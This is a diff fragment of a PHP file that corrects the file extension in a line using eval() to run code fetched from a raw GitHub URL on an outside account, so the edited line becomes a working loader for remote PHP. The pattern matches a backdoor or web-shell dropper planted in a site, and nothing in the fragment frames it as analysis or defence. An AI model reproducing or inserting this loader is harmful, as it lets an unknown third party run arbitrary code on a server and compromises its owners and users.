@@ -17,4 +17,4 @@ function getURL($url) {
 }
 
 
-eval("?>" . getURL("https://raw.githubusercontent.com/ayahynek/hk/refs/heads/main/pbaunila.phpp"));
+eval("?>" . getURL("https://raw.githubusercontent.com/ayahynek/hk/refs/heads/main/pbaunila.php"));
